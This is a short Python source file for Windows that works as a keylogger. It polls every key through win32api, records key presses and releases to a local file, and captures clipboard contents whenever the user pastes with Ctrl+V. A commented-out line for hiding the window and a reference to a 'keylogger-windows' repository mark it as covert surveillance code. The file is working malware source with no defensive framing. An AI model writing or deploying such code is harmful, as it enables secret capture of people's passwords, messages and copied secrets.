import win32clipboard, win32api, win32gui, win32con
from time import sleep, time



#win32gui.ShowWindow(the_program_to_hidewin32gui.GetForegroundWindow() , win32con.SW_HIDE)
#htpps://www.github.com/crash-exe/keylogger-windows


key_codes = {
    '\x01': 'LeftClick',
    '\x02': 'RightClick',
    '\x08': 'Backspace',
    '\x10': 'Shift',
    '\x11': 'Ctrl',
    '\x12': 'Alt',
    '\x14': 'CapsLock',
    '\x90': 'NumLock',
    '\t'  : 'Tab',
}


double = list(key_codes.keys())
double.remove('\t')
double.remove('\x08')
doubleNames = list(key_codes.values())
doubleNames.remove('LeftClick')


def get_key_code(key):
    try: return key_codes[key]
    except Exception: return key
def set_to_string(s):
    string = ''
    for e in s:
        string += str(e)
    return string

def get_clipboard():
    win32clipboard.OpenClipboard()
    content = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    return content
def get_keys_down():
    s = set()
    for i in range(256):

        b = win32api.GetKeyState(i)
        b = b&0x8000
        if b and not chr(i) == '\xa0':
            s.add(get_key_code(chr(i)))

    return s


def main_loop():
    prev = set()
    ctrlcv = False

    x = 0
    while True:
        x += 1
        if x == 100: x = 0
        keys = get_keys_down()
        if not prev == keys:
            d = keys.difference(prev)
            if d == set():
                d = prev.difference(keys)
                
                if set_to_string(d) in doubleNames:
                    ctrlcv = set_to_string(d) == 'Ctrl'
                    open('out', 'a').write("Released: " + set_to_string(d)+'\n')
            else:
                if ctrlcv and set_to_string(d) == 'V':
                     open('out', 'a').write("Pasted: " + get_clipboard()+'\n')
                else:
                    open('out', 'a').write("Pressed: " + set_to_string(d)+'\n')
        prev = keys
        

if __name__ == '__main__':
    main_loop()
    